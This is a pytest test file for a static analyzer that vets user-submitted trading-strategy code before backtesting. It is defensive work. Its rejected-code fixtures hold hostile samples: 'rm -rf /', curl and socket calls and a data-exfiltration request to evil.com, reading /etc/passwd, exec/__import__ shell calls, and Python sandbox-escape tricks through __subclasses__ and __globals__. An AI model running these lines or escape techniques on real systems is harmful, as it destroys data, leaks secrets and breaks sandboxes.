# tests.test_analysis
"""
Static analyzer unit tests with line profiling.

Run tests:
    pytest tests/test_analysis.py -v

Run with profiling:
    python -m kernprof -l -v tests/test_analysis.py
"""

import pytest
from datetime import datetime

from src.validation.analysis import StaticAnalyzer, AnalysisError
from src.models.request import BacktestRequest


# ─────────────────────────────────────────────────────────────────────────────
# Test Fixtures
# ─────────────────────────────────────────────────────────────────────────────

def make_request(code: str) -> BacktestRequest:
    """Helper to create a BacktestRequest with given strategy code."""
    return BacktestRequest(
        strategy_code=code,
        start_date=datetime(2020, 1, 1),
        end_date=datetime(2021, 1, 1),
        initial_capital=10000.0,
    )


# ─────────────────────────────────────────────────────────────────────────────
# Valid Strategy Code Samples
# ─────────────────────────────────────────────────────────────────────────────

VALID_MINIMAL_STRATEGY = """
from hqg_algorithms import Strategy

class MyStrategy(Strategy):
    def universe(self):
        return ["AAPL", "MSFT"]

    def on_data(self, data, portfolio):
        return {"AAPL": 0.5, "MSFT": 0.5}
"""

VALID_NUMPY_PANDAS_STRATEGY = """
import numpy as np
import pandas as pd
from datetime import timedelta
from collections import deque
from hqg_algorithms import Strategy

class MomentumStrategy(Strategy):
    def __init__(self):
        self.lookback = 20
        self.history = {}

    def universe(self):
        return ["SPY", "QQQ", "IWM"]

    def on_data(self, data, portfolio):
        weights = {}
        returns = []

        for sym in self.universe():
            price = data.close(sym)
            if price is not None:
                if sym not in self.history:
                    self.history[sym] = deque(maxlen=self.lookback)
                self.history[sym].append(price)

                if len(self.history[sym]) >= self.lookback:
                    arr = np.array(self.history[sym])
                    ret = (arr[-1] / arr[0]) - 1
                    returns.append((sym, ret))

        if not returns:
            return None

        # Rank by momentum
        returns.sort(key=lambda x: x[1], reverse=True)
        top = returns[:2]

        for sym, _ in top:
            weights[sym] = 1.0 / len(top)

        return weights
"""

VALID_MATH_STRATEGY = """
import math
from typing import Dict, Optional
from hqg_algorithms import Strategy

class VolatilityStrategy(Strategy):
    def universe(self):
        return ["AAPL"]

    def on_data(self, data, portfolio) -> Optional[Dict[str, float]]:
        price = data.close("AAPL")
        if price is None:
            return None

        # Use math functions
        log_price = math.log(price)
        sqrt_price = math.sqrt(price)

        weight = min(1.0, max(0.0, math.tanh(log_price / 10)))
        return {"AAPL": weight}
"""

VALID_COMPREHENSIONS_STRATEGY = """
from hqg_algorithms import Strategy

class ComprehensionStrategy(Strategy):
    def universe(self):
        return [f"STOCK{i}" for i in range(5)]

    def on_data(self, data, portfolio):
        prices = {sym: data.close(sym) for sym in self.universe() if data.close(sym)}

        if not prices:
            return None

        total = sum(prices.values())
        weights = {sym: price / total for sym, price in prices.items()}

        # Filter small weights
        filtered = {k: v for k, v in weights.items() if v > 0.1}

        return filtered if filtered else None
"""


# ─────────────────────────────────────────────────────────────────────────────
# Invalid Code Samples
# ─────────────────────────────────────────────────────────────────────────────

INVALID_SYNTAX = """
def broken(
    return None
"""

INVALID_IMPORT_OS = """
import os
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        os.system("rm -rf /")
        return None
"""

INVALID_IMPORT_SUBPROCESS = """
import subprocess
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        subprocess.run(["curl", "http://evil.com"])
        return None
"""

INVALID_IMPORT_SOCKET = """
import socket
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        s = socket.socket()
        s.connect(("evil.com", 80))
        return None
"""

INVALID_IMPORT_REQUESTS = """
import requests
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        requests.get("http://evil.com/exfil?data=secret")
        return None
"""

INVALID_BUILTIN_EVAL = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        code = "print('pwned')"
        eval(code)
        return None
"""

INVALID_BUILTIN_EXEC = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        exec("import os; os.system('whoami')")
        return None
"""

INVALID_BUILTIN_OPEN = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        with open("/etc/passwd") as f:
            data = f.read()
        return None
"""

INVALID_BUILTIN_COMPILE = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        code = compile("import os", "<string>", "exec")
        return None
"""

INVALID_BUILTIN_IMPORT = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        os = __import__("os")
        os.system("whoami")
        return None
"""

INVALID_ATTRIBUTE_GLOBALS = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        # Try to access globals via function attribute
        fn = lambda: None
        g = fn.__globals__
        return None
"""

INVALID_ATTRIBUTE_CODE = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        def inner():
            pass
        code_obj = inner.__code__
        return None
"""

INVALID_ATTRIBUTE_BUILTINS = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        b = (1).__class__.__bases__[0].__subclasses__()
        return None
"""

INVALID_ATTRIBUTE_CLASS = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        # Try sandbox escape via __class__
        cls = "".__class__
        return None
"""

INVALID_ATTRIBUTE_MRO = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        mro = str.__mro__
        return None
"""

INVALID_NO_STRATEGY_CLASS = """
import numpy as np

def calculate_weights(prices):
    return {k: 1.0/len(prices) for k in prices}

def main():
    weights = calculate_weights({"AAPL": 150, "MSFT": 300})
    print(weights)
"""

INVALID_WRONG_INHERITANCE = """
class MyStrategy:
    def on_data(self, data, portfolio):
        return {"AAPL": 1.0}
"""

# Edge case: Strategy class exists but doesn't inherit
INVALID_STRATEGY_NO_INHERIT = """
class Strategy:
    pass

class MyStrategy:
    def on_data(self, data, portfolio):
        return None
"""


# ─────────────────────────────────────────────────────────────────────────────
# Tests - Valid Code
# ─────────────────────────────────────────────────────────────────────────────

class TestValidStrategies:
    """Test that valid strategy code passes analysis."""

    def test_minimal_strategy(self):
        request = make_request(VALID_MINIMAL_STRATEGY)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, BacktestRequest), f"Expected BacktestRequest, got {type(result)}"
        assert result == request

    def test_numpy_pandas_strategy(self):
        request = make_request(VALID_NUMPY_PANDAS_STRATEGY)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, BacktestRequest)

    def test_math_strategy(self):
        request = make_request(VALID_MATH_STRATEGY)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, BacktestRequest)

    def test_comprehensions_strategy(self):
        request = make_request(VALID_COMPREHENSIONS_STRATEGY)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, BacktestRequest)


# ─────────────────────────────────────────────────────────────────────────────
# Tests - Syntax Errors
# ─────────────────────────────────────────────────────────────────────────────

class TestSyntaxErrors:
    def test_invalid_syntax(self):
        """Syntax errors should be caught."""
        request = make_request(INVALID_SYNTAX)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, AnalysisError)
        assert not result.is_empty()
        assert any("Syntax error" in e for e in result.errors)

    def test_syntax_error_location(self):
        request = make_request(INVALID_SYNTAX)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, AnalysisError)
        assert any("line" in e for e in result.errors)


# ─────────────────────────────────────────────────────────────────────────────
# Tests - Forbidden Imports
# ─────────────────────────────────────────────────────────────────────────────

class TestForbiddenImports:
    @pytest.mark.parametrize("code,module", [
        (INVALID_IMPORT_OS, "os"),
        (INVALID_IMPORT_SUBPROCESS, "subprocess"),
        (INVALID_IMPORT_SOCKET, "socket"),
        (INVALID_IMPORT_REQUESTS, "requests"),
    ])
    def test_forbidden_import(self, code: str, module: str):
        request = make_request(code)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, AnalysisError), f"Import of {module} should be rejected"
        assert not result.is_empty()
        assert any("Import" in e and "not allowed" in e for e in result.errors)

    def test_import_from_forbidden(self):
        """'from X import Y' with forbidden X should be rejected."""
        code = """
from os.path import join
from hqg_algorithms import Strategy

class S(Strategy):
    def on_data(self, data, portfolio):
        return None
"""
        request = make_request(code)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, AnalysisError)
        assert any("Import" in e for e in result.errors)

    def test_nested_import_forbidden(self):
        """Nested forbidden imports (os.path) should be rejected."""
        code = """
import os.path
from hqg_algorithms import Strategy

class S(Strategy):
    def on_data(self, data, portfolio):
        return None
"""
        request = make_request(code)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, AnalysisError)


# ─────────────────────────────────────────────────────────────────────────────
# Tests - Forbidden Builtins
# ─────────────────────────────────────────────────────────────────────────────

class TestForbiddenBuiltins:
    """Test that forbidden builtin calls are rejected."""

    @pytest.mark.parametrize("code,builtin", [
        (INVALID_BUILTIN_EVAL, "eval"),
        (INVALID_BUILTIN_EXEC, "exec"),
        (INVALID_BUILTIN_OPEN, "open"),
        (INVALID_BUILTIN_COMPILE, "compile"),
        (INVALID_BUILTIN_IMPORT, "__import__"),
    ])
    def test_forbidden_builtin(self, code: str, builtin: str):
        """Forbidden builtin calls should be rejected."""
        request = make_request(code)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, AnalysisError), f"Use of {builtin}() should be rejected"
        assert not result.is_empty()
        assert any(builtin in e and "forbidden" in e for e in result.errors)

    def test_breakpoint_forbidden(self):
        """breakpoint() should be forbidden."""
        code = """
from hqg_algorithms import Strategy

class S(Strategy):
    def on_data(self, data, portfolio):
        breakpoint()
        return None
"""
        request = make_request(code)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, AnalysisError)

    def test_globals_forbidden(self):
        """globals() should be forbidden."""
        code = """
from hqg_algorithms import Strategy

class S(Strategy):
    def on_data(self, data, portfolio):
        g = globals()
        return None
"""
        request = make_request(code)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, AnalysisError)


# ─────────────────────────────────────────────────────────────────────────────
# Tests - Forbidden Attributes
# ─────────────────────────────────────────────────────────────────────────────

class TestForbiddenAttributes:
    """Test that forbidden attribute access is rejected."""

    @pytest.mark.parametrize("code,attr", [
        (INVALID_ATTRIBUTE_GLOBALS, "__globals__"),
        (INVALID_ATTRIBUTE_CODE, "__code__"),
        (INVALID_ATTRIBUTE_CLASS, "__class__"),
        (INVALID_ATTRIBUTE_MRO, "__mro__"),
    ])
    def test_forbidden_attribute(self, code: str, attr: str):
        """Forbidden attribute access should be rejected."""
        request = make_request(code)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, AnalysisError), f"Access to {attr} should be rejected"
        assert not result.is_empty()
        assert any(attr in e and "forbidden" in e for e in result.errors)

    def test_bases_forbidden(self):
        """__bases__ access should be forbidden."""
        request = make_request(INVALID_ATTRIBUTE_BUILTINS)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, AnalysisError)
        assert any("__bases__" in e or "__class__" in e for e in result.errors)


# ─────────────────────────────────────────────────────────────────────────────
# Tests - Missing Strategy Class
# ─────────────────────────────────────────────────────────────────────────────

class TestMissingStrategy:
    """Test that missing Strategy class is caught."""

    def test_no_strategy_class(self):
        request = make_request(INVALID_NO_STRATEGY_CLASS)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, AnalysisError)
        assert any("Strategy" in e for e in result.errors)

    def test_wrong_inheritance(self):
        request = make_request(INVALID_WRONG_INHERITANCE)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, AnalysisError)
        assert any("Strategy" in e for e in result.errors)

    def test_strategy_no_inherit(self):
        request = make_request(INVALID_STRATEGY_NO_INHERIT)
        result = StaticAnalyzer.analyze(request)

        assert isinstance(result, AnalysisError)
        assert any("Strategy" in e for e in result.errors)

# ─────────────────────────────────────────────────────────────────────────────
# Performance Profiling
# ─────────────────────────────────────────────────────────────────────────────

VALID_STRATEGIES = [
    ("minimal", VALID_MINIMAL_STRATEGY),
    ("numpy_pandas", VALID_NUMPY_PANDAS_STRATEGY),
    ("math", VALID_MATH_STRATEGY),
    ("comprehensions", VALID_COMPREHENSIONS_STRATEGY),
]

INVALID_STRATEGIES = [
    ("syntax", INVALID_SYNTAX),
    ("import_os", INVALID_IMPORT_OS),
    ("import_subprocess", INVALID_IMPORT_SUBPROCESS),
    ("import_socket", INVALID_IMPORT_SOCKET),
    ("import_requests", INVALID_IMPORT_REQUESTS),
    ("builtin_eval", INVALID_BUILTIN_EVAL),
    ("builtin_exec", INVALID_BUILTIN_EXEC),
    ("builtin_open", INVALID_BUILTIN_OPEN),
    ("builtin_compile", INVALID_BUILTIN_COMPILE),
    ("builtin_import", INVALID_BUILTIN_IMPORT),
    ("attr_globals", INVALID_ATTRIBUTE_GLOBALS),
    ("attr_code", INVALID_ATTRIBUTE_CODE),
    ("attr_builtins", INVALID_ATTRIBUTE_BUILTINS),
    ("attr_class", INVALID_ATTRIBUTE_CLASS),
    ("attr_mro", INVALID_ATTRIBUTE_MRO),
    ("no_strategy", INVALID_NO_STRATEGY_CLASS),
    ("wrong_inheritance", INVALID_WRONG_INHERITANCE),
    ("no_inherit", INVALID_STRATEGY_NO_INHERIT),
]

if __name__ == "__main__":
    """
    Profile the static analyzer against all test strategies.

    Profile: python -m kernprof -l -v tests/test_analysis.py
    Test: python tests/test_analysis.py
    """
    import time

    all_strategies = VALID_STRATEGIES + INVALID_STRATEGIES
    iterations = 100

    print(f"Profiling StaticAnalyzer with {len(all_strategies)} strategies x {iterations} iterations\n")

    total_start = time.perf_counter()
    for name, code in all_strategies:
        request = make_request(code)
        start = time.perf_counter()
        for _ in range(iterations):
            StaticAnalyzer.analyze(request)
        elapsed = (time.perf_counter() - start) * 1000
        print(f"  {name:25} {elapsed:8.2f}ms ({elapsed/iterations:.3f}ms/iter)")

    total_elapsed = (time.perf_counter() - total_start) * 1000
    print(f"\nTotal: {total_elapsed:.2f}ms")
